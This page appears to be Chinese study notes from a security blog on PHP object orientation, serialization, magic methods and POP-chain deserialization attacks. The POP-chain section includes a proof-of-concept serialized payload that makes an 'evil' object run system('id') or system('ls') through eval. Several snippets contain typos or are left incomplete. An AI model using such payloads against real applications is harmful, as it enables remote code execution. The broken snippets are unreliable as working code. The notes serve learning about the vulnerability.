+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;  <span style="color:#75715e">//this当前类,调用上面的name。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> $var1;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h5 id="实例化与赋值">实例化与赋值<a hidden class="anchor" aria-hidden="true" href="#实例化与赋值">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">hero</span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> $name;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> $sex;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> $blood;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">jineng</span>($var1) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br /&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $var1<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br /&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$cyj<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">hero</span>();  <span style="color:#75715e">//实例化对象并赋值到cyj
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$cyj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;chengyaojin&#39;</span>; <span style="color:#75715e">//重新赋值name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$cyj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sex</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;男&#39;</span>;    <span style="color:#75715e">//赋值性别
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$cyj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blood</span><span style="color:#f92672">=</span><span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span>$cyj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">jineng</span>(<span style="color:#e6db74">&#39;zuofan&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print_r</span>($cyj);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">chengyaojin
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">zuofan
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">hero Object ( [name] =&gt; chengyaojin [sex] =&gt; man )
+</span></span></span></code></pre></div><p>赋值 的时候需要</p>
+<h4 id="修饰符">修饰符<a hidden class="anchor" aria-hidden="true" href="#修饰符">#</a></h4>
+<p><strong>public</strong>  完全可以调用</p>
+<p><strong>private</strong>  只有自己可以调用</p>
+<p><strong>protected</strong>  自己和子类可以调用</p>
+<h2 id="反序列化-1">反序列化<a hidden class="anchor" aria-hidden="true" href="#反序列化-1">#</a></h2>
+<h3 id="序列化的作用">序列化的作用<a hidden class="anchor" aria-hidden="true" href="#序列化的作用">#</a></h3>
+<p>方便存储，数据传输。</p>
+<h3 id="表达方式">表达方式<a hidden class="anchor" aria-hidden="true" href="#表达方式">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"></code></pre></div><p>空字符： null N;</p>
+<p>整形： 666  i:666;</p>
+<p>只序列化成员变量，不序列化函数。</p>
+<p>private</p>
+<p>在序列化的时候会加上类名，并且加上nul，在前后。</p>
+<h4 id="反序列化后仍是对象">反序列化后仍是对象<a hidden class="anchor" aria-hidden="true" href="#反序列化后仍是对象">#</a></h4>
+<h4 id="反序列化与原来的无关与传入的字符串值相关">反序列化与原来的无关，与传入的字符串值相关<a hidden class="anchor" aria-hidden="true" href="#反序列化与原来的无关与传入的字符串值相关">#</a></h4>
+<p><img loading="lazy" src="/img/image-20230516165648893.png" alt="image-20230516165648893"  />
+</p>
+<p>反序列化生成的对象的值由我们提供，并不是原来的benben，而是传入的dazhuang。</p>
+<h4 id="使用成员方法">使用成员方法<a hidden class="anchor" aria-hidden="true" href="#使用成员方法">#</a></h4>
+<p>可以调用上面的成员方法，因为上面的test类还在，所以自己生成的反序列化对象可以调用displayVar方法</p>
+<h3 id="漏洞">漏洞<a hidden class="anchor" aria-hidden="true" href="#漏洞">#</a></h3>
+<p>成因，反序列化的接受字符串可控。</p>
+<h4 id="魔术方法">魔术方法<a hidden class="anchor" aria-hidden="true" href="#魔术方法">#</a></h4>
+<p><strong>自动触发的行为</strong>之前或者之后。</p>
+<h6 id="会不会">会不会<a hidden class="anchor" aria-hidden="true" href="#会不会">#</a></h6>
+<p><strong>触发时机</strong>&ndash;功能&ndash;参数&ndash;返回值</p>
+<h4 id="construct">construct（）<a hidden class="anchor" aria-hidden="true" href="#construct">#</a></h4>
+<p>构造方法，<strong>实例化对象</strong>的时候会自动触发。</p>
+<p><strong>特殊</strong>不用调用就可以直接执行函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;benben&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;触发了构造函数1次&#34;</span> ;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>(<span style="color:#e6db74">&#34;benben&#34;</span>);   <span style="color:#75715e">//自动执行echo函数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$ser <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($test);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">unserialize</span>($ser);
+</span></span><span style="display:flex;"><span>$test<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">__construct</span>(<span style="color:#e6db74">&#34;dasds&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    触发了构造函数1次 //构造函数触发
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    触发了构造函数1次 //下面的函数触发
+</span></span></span></code></pre></div><h4 id="destruct">destruct（）<a hidden class="anchor" aria-hidden="true" href="#destruct">#</a></h4>
+<p>引用被删除或者对象被销毁的时候触发。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;触发了析构函数1次&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br /&gt;&#34;</span> ;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>(<span style="color:#e6db74">&#34;benben&#34;</span>);  <span style="color:#75715e">//触发一次
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$ser <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($test);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">unserialize</span>($ser);   <span style="color:#75715e">//触发第二次
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">触发了析构函数1次
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">触发了析构函数1次
+</span></span></span></code></pre></div><p>反序列化的时候会自动触发这个函数，所以只要提交反序列化的话就会直接执行。</p>
+<h4 id="sleep">sleep（）<a hidden class="anchor" aria-hidden="true" href="#sleep">#</a></h4>
+<p>在使用serialize函数时，会自动调用，先执行sleep函数，然后再进行序列化。</p>
+<h4 id="wakeup">wakeup<a hidden class="anchor" aria-hidden="true" href="#wakeup">#</a></h4>
+<p>在使用unserialize之前会检查是否有这一函数，如果有的话，会先执行这一函数然后再执行反序列化</p>
+<h4 id="__tostring">__toString<a hidden class="anchor" aria-hidden="true" href="#__tostring">#</a></h4>
+<p>在一个类被定义为字符串的时候会执行，</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TestClass</span>
+</span></span><span style="display:flex;"><span>{ 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $foo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($foo) 										 	    
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">foo</span> <span style="color:#f92672">=</span> $foo;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">foo</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$class <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">TestClass</span>(<span style="color:#e6db74">&#39;Hello&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $class;   <span style="color:#75715e">// 运行结果：Hello
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">print_r</span>($class)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><img loading="lazy" src="/img/image-20230517214855708.png" alt="未调用魔术方法"  />
+</p>
+<p><img loading="lazy" src="/img/image-20230517215126324.png" alt="调用魔术方法，返回了Hello"  />
+</p>
+<h4 id="invoke">invoke()<a hidden class="anchor" aria-hidden="true" href="#invoke">#</a></h4>
+<p>当尝试以调用函数的方式调用一个对象时，<a href="http://php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a> 方法会被自动调用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CallableClass</span> 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __invoke($x) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">var_dump</span>($x);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">CallableClass</span>;
+</span></span><span style="display:flex;"><span>$obj(<span style="color:#ae81ff">5</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">is_callable</span>($obj));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><img loading="lazy" src="/img/image-20230517220725218.png" alt="image-20230517220725218"  />
+</p>
+<h3 id="错误调用魔术方法">错误调用魔术方法<a hidden class="anchor" aria-hidden="true" href="#错误调用魔术方法">#</a></h3>
+<h4 id="__call">__call()<a hidden class="anchor" aria-hidden="true" href="#__call">#</a></h4>
+<p>调用<strong>不存在</strong>的成员<strong>方法</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __call($arg1,$arg2)<span style="color:#a6e22e">arg1为callxxx，arg2为传递参数</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$arg1</span><span style="color:#e6db74">,</span><span style="color:#e6db74">$arg2[0]</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>() ;
+</span></span><span style="display:flex;"><span>$test <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">callxxx</span>(<span style="color:#e6db74">&#39;a&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">/*运行结果
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">*/
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">callxxx,a
+</span></span></span></code></pre></div><h4 id="__callstatic">__callStatic()<a hidden class="anchor" aria-hidden="true" href="#__callstatic">#</a></h4>
+<p>比上文多了一个静态</p>
+<h4 id="__get">__get()<a hidden class="anchor" aria-hidden="true" href="#__get">#</a></h4>
+<p>调用的成员属性不存在。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $var1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __get($ags1){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $ags1<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;不存在&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$test<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
+</span></span><span style="display:flex;"><span>	$test<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var2</span>;      <span style="color:#75715e">//触发get，将不存在的var2赋值给ags1；
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//echo &#34;\n&#34;.$test-&gt;var1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">shuchu</span> <span style="color:#f92672">:</span><span style="color:#a6e22e">var2不存在</span>[<span style="color:#a6e22e">Finished</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">0.1</span><span style="color:#a6e22e">s</span>]
+</span></span></code></pre></div><h4 id="__set">__set<a hidden class="anchor" aria-hidden="true" href="#__set">#</a></h4>
+<p>给不存在的成员赋值。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $var1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __set($ags1 ,$ags2){   <span style="color:#75715e">//$ags1--变量名 ,$ags2--变量值
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">echo</span> $ags1<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;不存在&#34;</span><span style="color:#f92672">.</span>$ags2<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;赋值给谁啊&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$test<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
+</span></span><span style="display:flex;"><span>	$test<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var2</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;benben&#34;</span>;  <span style="color:#75715e">//赋值的var2并不存在
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">输出：var2不存在benben赋值给谁啊</span>
+</span></span></code></pre></div><h4 id="__isset">__isset<a hidden class="anchor" aria-hidden="true" href="#__isset">#</a></h4>
+<p>对不可访问属性调用 <a href="http://php.net/manual/zh/function.isset.php">isset()</a> 或 <a href="http://php.net/manual/zh/function.empty.php">empty()</a> 时，<a href="http://php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> 会被调用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $var;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __isset($arg1 )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span>  $arg1<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;不存在或者为私有属性&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>() ;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">isset</span>($test<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var</span>);	<span style="color:#75715e">//var是私有属性，无法被调用
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">isset</span>($test<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var2</span>);   <span style="color:#75715e">//var2不存在，所以会直接调用
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    shuchu:var不存在或者为私有属性
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">var2不存在或者为私有属性
+</span></span></span></code></pre></div><h4 id="__unset">__unset<a hidden class="anchor" aria-hidden="true" href="#__unset">#</a></h4>
+<h4 id="__clone">__clone<a hidden class="anchor" aria-hidden="true" href="#__clone">#</a></h4>
+<p>使用clone的时候触发</p>
+<p><img loading="lazy" src="/img/image-20230517223909282.png" alt="image-20230517223909282"  />
+</p>
+<h3 id="pop链">pop链<a hidden class="anchor" aria-hidden="true" href="#pop链">#</a></h3>
+<h4 id="前置知识--反推法">前置知识&ndash;反推法<a hidden class="anchor" aria-hidden="true" href="#前置知识--反推法">#</a></h4>
+<p>魔术方法的触发条 件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">index</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $test;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">evil</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// public function __destruct(){
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//     $this-&gt;test-&gt;action();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// class normal {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//     public function action(){
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         echo &#34;please attack me&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//     }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">evil</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> $test2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;system(&#39;id&#39;);&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// public function action(){
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//     eval($this-&gt;test2);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">index</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span>(<span style="color:#a6e22e">serialize</span>($a));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    O:5:&#34;index&#34;:1:{s:11:&#34;%00index%00test&#34;;O:4:&#34;evil&#34;:1:{s:5:&#34;test2&#34;;s:13:&#34;system(%27id%27);&#34;;}} //空格替换
+</span></span></span></code></pre></div><p>上面构造的poc会在实例化index的时候调用__costruct函数，并且将evil实例化给test，就可以顺利的执行下面的<code> $this-&gt;test-&gt;action();</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">index</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $test;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">evil</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> $test2;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">evil</span>();
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test2</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;system(&#39;ls&#39;);&#34;</span>;
+</span></span><span style="display:flex;"><span>$b<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">index</span>();
+</span></span><span style="display:flex;"><span>$b<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span><span style="color:#f92672">=</span>$a;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span>(<span style="color:#a6e22e">ser</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></div><p>这个函数时去除了没用的然后构造。</p>
+<p><img loading="lazy" src="/img/image-20230518163611836.png" alt="image-20230518163611836"  />
+</p>
+<p>b时sec的对像，在反序列化的时候无法触发class fast中的wakeup魔术方法。</p>
+<p><strong>所以</strong>想要触发最后的__tostring方法，必须得调用echo的时候输出的是一个对象source，这就需要在反序列化的时候将source赋值为对象，这一点已经做到了，但是这时候并不能调用其他类里面的魔术方法，所以就需要在调用wakeup的时候，source必须是一个sec的对象。所以最后只要反序列化一个sec的对象并且作为参数传递就可以了。</p>
+<p><strong>总结</strong>构造的时候，最外层是一个fast的类，因为需要触发wakeup的，魔术方法。往里就是source，但是不能作为一个参数，而是作为一个对象。这个就是sec类的对象。在这个对象中就可以了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$a<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">fast</span>();
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">sec</span>();    <span style="color:#75715e">//赋值source为对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($a);
+</span></span></code></pre></div><h3 id="poc编写">poc编写<a hidden class="anchor" aria-hidden="true" href="#poc编写">#</a></h3>
+<p>反推法构造</p>
